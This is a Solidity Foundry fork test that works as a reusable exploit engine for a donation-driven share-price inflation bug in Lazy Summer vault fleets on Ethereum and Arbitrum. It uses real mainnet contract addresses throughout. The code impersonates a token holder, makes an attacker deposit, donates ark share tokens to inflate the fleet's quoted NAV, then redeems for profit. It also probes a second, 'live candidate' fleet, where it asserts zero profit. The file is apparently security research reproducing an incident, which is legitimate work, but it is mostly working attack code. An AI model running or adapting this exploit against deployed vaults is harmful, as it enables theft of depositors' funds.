// SPDX-License-Identifier: MIT
pragma solidity ^0.8.24;

import {Test, console} from "forge-std/Test.sol";
import {IERC20Like, IFleetCommander, IArk, IVault4626} from "../src/Interfaces.sol";

/// @title Generic_Donation — parameterised donation-NAV-inflation engine for Lazy Summer fleets
///
/// @notice One engine, N fleets. For any (fleet, ark) pair it:
///           1. reads NAV / supply / PPS / withdrawableTotalAssets / ark NAV / vault rate,
///           2. (optionally) has the attacker deposit into the fleet to obtain redeemable shares,
///           3. performs a physical donation of the ark's share token to the ark,
///           4. re-reads NAV / PPS and asserts the fleet's quote was inflated while the
///              realisable amount (`withdrawableTotalAssets`) was not,
///           5. computes the *max extractable* = the fleet's realisable assets
///              (buffer ark + liquid arks), and
///           6. redeems and asserts a net profit **iff** the attacker can (a) obtain fleet
///              shares (deposits open) and (b) obtain the ark's share token *below* the NAV the
///              ark credits it at.
///
///         If either condition fails the test asserts net == 0 and documents why. This is not a
///         cop-out: donating a token acquired at its credited NAV is loss-making by construction,
///             net = d*(credited - d)/(T + d) - credited  <  0  for credited > d,
///         so the bug is only *exploitable* when the ark token is obtainable below NAV.
///
/// Wired-in configurations:
///   * Ethereum LowerRisk USDC  — engine self-test: deposits open + discounted inventory exists
///                                (the real attacker's executor pre-positioned vgUSDC).
///   * Arbitrum LowerRisk USDC  — the live P7-O3 candidate.
contract Generic_Donation is Test {
    // ---------------------------------------------------------------------------------
    // Config
    // ---------------------------------------------------------------------------------
    enum Source {
        Holder,      // impersonate a configured holder of the ark's share token
        VaultDeposit // mint the share token at the vault's fair NAV rate (cost == credited)
    }

    struct FleetConfig {
        string name;
        uint256 forkBlock;
        string rpcEnv;
        string rpcFallback;
        address fleet;
        address ark;          // the donation-sensitive ark
        address bufferArk;    // fleet buffer ark (liquid)
        address[] liquidArks; // other arks whose assets are genuinely withdrawable
        address holder;       // donor used when source == Holder
        Source source;
        bool belowNavVenue;   // can the ark's share token be acquired below credited NAV?
        uint256 depositBudget;
        uint256 donationCap;  // max ark-token units to donate (type(uint256).max == all)
    }

    struct Report {
        uint256 navBefore;
        uint256 ppsBefore;
        uint256 withdrawableBefore;
        uint256 arkNavBefore;
        uint256 vaultRatePer1e18;
        uint256 arkMaxWithdraw;
        uint256 maxExtractable;
        uint256 navMid;
        uint256 ppsMid;
        uint256 withdrawableMid;
        uint256 donatedShares;
        uint256 credited;
        uint256 navAfter;
        uint256 ppsAfter;
        uint256 withdrawableAfter;
        uint256 depositAmount;
        uint256 shares;
        uint256 net;
        bool depositsOpen;
        bool exploitPath;
    }

    // ---- Ethereum LowerRisk USDC (engine self-test) ----
    function _ethCfg() internal pure returns (FleetConfig memory c) {
        address[] memory liquid = new address[](0);
        c = FleetConfig({
            name: "LazyVault_LowerRisk_USDC (Ethereum)",
            forkBlock: 25_471_347,
            rpcEnv: "FORK_RPC_URL",
            rpcFallback: "https://ethereum-rpc.publicnode.com",
            fleet: 0x98C49e13bf99D7CAd8069faa2A370933EC9EcF17,
            ark: 0x61d7063041d83C8ca3E42c39181dFd14B3Bc76c2,
            bufferArk: 0x106CBB1F445F0bFFa7894F4199EE940BF7f6dD2B,
            liquidArks: liquid,
            holder: 0x0514F827C129C16418a0933E03C99A6AF982FC61, // attacker executor inventory
            source: Source.Holder,
            belowNavVenue: true,
            depositBudget: 50_000e6,
            donationCap: type(uint256).max
        });
    }

    // ---- Arbitrum LowerRisk USDC (live P7-O3 candidate) ----
    function _arbCfg() internal pure returns (FleetConfig memory c) {
        address[] memory liquid = new address[](1);
        liquid[0] = 0x4EF91E09ADb31CC7Ec9b663B6827155D6a103b74; // Sky sUSDC ERC4626Ark (~335.12 USDC)
        c = FleetConfig({
            name: "LazyVault_LowerRisk_USDC (Arbitrum)",
            forkBlock: 518_241_570,
            rpcEnv: "ARB_RPC_URL",
            rpcFallback: "https://arbitrum-one-rpc.publicnode.com",
            fleet: 0x4F63cfEa7458221CB3a0EEE2F31F7424Ad34bb58,
            ark: 0x125dAE47930c1118cf2dB5A140877C64B408783C, // SiloManagedVault-varlamore-usdc-42161
            bufferArk: 0xbb79242B9518F450cDe8eb957E15c38ab09B1419, // ~414.89 USDC
            liquidArks: liquid,
            holder: 0xd8454B3787c6Aab1cf2846AF7882f8c440C3903d, // largest vgUSDC (Arb) holder
            source: Source.Holder,
            belowNavVenue: false, // only mintable at NAV; maxWithdraw(ark)==0 (no discount venue found)
            depositBudget: 0,
            donationCap: 1e21 // credited ≈ $1.861M — large enough to move PPS at 1e6-share granularity
        });
    }

    // ---------------------------------------------------------------------------------
    // Engine
    // ---------------------------------------------------------------------------------
    function _rpc(FleetConfig memory c) internal view returns (string memory) {
        return vm.envOr(c.rpcEnv, string(c.rpcFallback));
    }

    function _liquidSum(FleetConfig memory c) internal view returns (uint256 sum) {
        sum = IArk(c.bufferArk).totalAssets();
        for (uint256 i; i < c.liquidArks.length; i++) {
            sum += IArk(c.liquidArks[i]).totalAssets();
        }
    }

    function _run(FleetConfig memory c) internal returns (Report memory r) {
        vm.createSelectFork(_rpc(c), c.forkBlock);
        // FleetCommander.maxDeposit(owner) is capped by asset.balanceOf(owner); fund this
        // contract first so the "are deposits open?" probe is meaningful.
        if (c.depositBudget > 0) {
            deal(IVault4626(IArk(c.ark).vault()).asset(), address(this), c.depositBudget);
        }
        _read(c, r);
        _logBefore(c, r);
        _depositAndDonate(c, r);
        _exploitLeg(c, r);
    }

    function _read(FleetConfig memory c, Report memory r) internal view {
        IFleetCommander fleet = IFleetCommander(c.fleet);
        IArk ark = IArk(c.ark);
        IVault4626 vault = IVault4626(ark.vault());

        r.navBefore = fleet.totalAssets();
        r.ppsBefore = fleet.convertToAssets(1e6);
        r.withdrawableBefore = fleet.withdrawableTotalAssets();
        r.arkNavBefore = ark.totalAssets();
        r.vaultRatePer1e18 = vault.convertToAssets(1e18);
        r.arkMaxWithdraw = vault.maxWithdraw(c.ark);
        r.maxExtractable = _liquidSum(c);
        r.depositsOpen = fleet.maxDeposit(address(this)) > 0;
        r.exploitPath = r.depositsOpen && c.belowNavVenue;
    }

    function _logBefore(FleetConfig memory c, Report memory r) internal view {
        console.log("================================================================");
        console.log("Fleet :", c.name);
        console.log("  fleet            :", c.fleet);
        console.log("  ark (donation)   :", c.ark);
        console.log("  ark share token  :", IArk(c.ark).vault());
        console.log("  -- before --");
        console.log("  totalAssets            :", r.navBefore);
        console.log("  PPS (per 1e6 shares)   :", r.ppsBefore);
        console.log("  withdrawableTotalAssets:", r.withdrawableBefore);
        console.log("  ark.totalAssets        :", r.arkNavBefore);
        console.log("  vault.convertToAssets(1e18):", r.vaultRatePer1e18);
        console.log("  vault.maxWithdraw(ark) :", r.arkMaxWithdraw);
        console.log("  max extractable        :", r.maxExtractable);
        console.log("  fleet.maxDeposit(this) :", IFleetCommander(c.fleet).maxDeposit(address(this)));
    }

    /// @dev optional attacker deposit, then the physical donation, then sensitivity assertions.
    function _depositAndDonate(FleetConfig memory c, Report memory r) internal {
        IFleetCommander fleet = IFleetCommander(c.fleet);
        IArk ark = IArk(c.ark);
        IVault4626 vault = IVault4626(ark.vault());
        address arkToken = ark.vault();
        address asset = vault.asset();

        if (r.exploitPath) {
            address attacker = makeAddr("generic-attacker");
            r.depositAmount = c.depositBudget;
            deal(asset, attacker, r.depositAmount);
            require(fleet.maxDeposit(attacker) >= r.depositAmount, "attacker deposit exceeds live fleet cap");
            vm.startPrank(attacker);
            IERC20Like(asset).approve(c.fleet, r.depositAmount);
            r.shares = fleet.deposit(r.depositAmount, attacker);
            vm.stopPrank();
            console.log("  -- attacker deposit --");
            console.log("  deposited             :", r.depositAmount);
            console.log("  shares received       :", r.shares);
        }

        r.navMid = fleet.totalAssets();
        r.ppsMid = fleet.convertToAssets(1e6);
        r.withdrawableMid = fleet.withdrawableTotalAssets();

        // acquire the ark's share token and donate it straight to the ark
        r.donatedShares = _acquire(c, arkToken, asset, vault);
        require(r.donatedShares > 0, "no ark share token acquired for donation");
        r.credited = vault.convertToAssets(r.donatedShares);
        IERC20Like(arkToken).transfer(c.ark, r.donatedShares); // <-- the donation

        r.navAfter = fleet.totalAssets();
        r.ppsAfter = fleet.convertToAssets(1e6);
        r.withdrawableAfter = fleet.withdrawableTotalAssets();

        console.log("  -- after donation --");
        console.log("  donated shares         :", r.donatedShares);
        console.log("  credited NAV (asset)   :", r.credited);
        console.log("  totalAssets            :", r.navAfter);
        console.log("  PPS (per 1e6 shares)   :", r.ppsAfter);
        console.log("  withdrawableTotalAssets:", r.withdrawableAfter);

        assertEq(r.navAfter - r.navMid, r.credited, "fleet NAV must rise by credited amount");
        assertGt(r.ppsAfter, r.ppsMid, "quoted PPS must rise");
        assertLt(r.withdrawableAfter, r.withdrawableMid + r.credited, "withdrawable must not track NAV");
    }

    function _exploitLeg(FleetConfig memory c, Report memory r) internal {
        IFleetCommander fleet = IFleetCommander(c.fleet);
        if (r.exploitPath) {
            address attacker = makeAddr("generic-attacker");
            vm.warp(block.timestamp + fleet.getCooldown() + 1);
            vm.prank(attacker);
            uint256 out = fleet.redeem(r.shares, attacker, attacker);
            r.net = out > r.depositAmount ? out - r.depositAmount : 0;
            console.log("  -- redeem --");
            console.log("  assets out             :", out);
            console.log("  net profit             :", r.net);
            assertGt(r.net, 0, "profitable venue must yield net > 0");
        } else {
            r.net = 0;
            console.log("  => net profit: 0 (exploit not executable here)");
            if (!r.depositsOpen) console.log("     reason: fleet.maxDeposit == 0 (cannot obtain redeemable shares)");
            if (!c.belowNavVenue) console.log("     reason: ark token only acquirable at credited NAV (no below-NAV venue)");
            assertEq(r.net, 0, "must assert $0 when no profitable venue exists");
        }
    }

    /// @dev Obtain `min(holderBalance, cap)` units of the ark's share token.
    function _acquire(
        FleetConfig memory c,
        address arkToken,
        address asset,
        IVault4626 vault
    ) internal returns (uint256 amt) {
        if (c.source == Source.Holder) {
            uint256 bal = IERC20Like(arkToken).balanceOf(c.holder);
            amt = bal > c.donationCap ? c.donationCap : bal;
            if (amt == 0) return 0;
            vm.prank(c.holder);
            IERC20Like(arkToken).transfer(address(this), amt);
        } else {
            uint256 budget = 1_000e6;
            deal(asset, address(this), budget);
            IERC20Like(asset).approve(arkToken, budget);
            amt = vault.deposit(budget, address(this));
        }
    }

    // ---------------------------------------------------------------------------------
    // Tests
    // ---------------------------------------------------------------------------------
    function test_generic_engine_ethereum_selftest() public {
        Report memory r = _run(_ethCfg());
        assertGt(r.net, 0, "engine self-test should be profitable on the exploited fleet");
    }

    function test_generic_arbitrum_live_candidate() public {
        FleetConfig memory c = _arbCfg();
        Report memory r = _run(c);

        // Max extractable = the fleet's realisable liquidity: buffer (~414.89) + Sky sUSDC (~335.12).
        console.log("  bufferArk.totalAssets :", IArk(c.bufferArk).totalAssets());
        for (uint256 i; i < c.liquidArks.length; i++) {
            console.log("  liquid ark totalAssets:", IArk(c.liquidArks[i]).totalAssets());
        }
        assertEq(r.maxExtractable, 750_014_057, "expected 414.892848 + 335.121209 USDC liquid");
        assertEq(r.maxExtractable, r.withdrawableBefore, "withdrawableTotalAssets should equal buffer+liquid arks");

        // The ark credits the donation at NAV but cannot realise it (illiquid vault) ...
        assertEq(r.arkMaxWithdraw, 0, "arbitrum vault should be illiquid for the ark");
        // ... and the fleet is closed to new deposits, so redeemable shares are unobtainable.
        assertFalse(r.depositsOpen, "arbitrum fleet deposits expected closed at fork block");
        // No venue lets an attacker obtain the ark token below its credited NAV -> $0.
        assertEq(r.net, 0, "no below-NAV acquisition venue => net $0");
    }
}
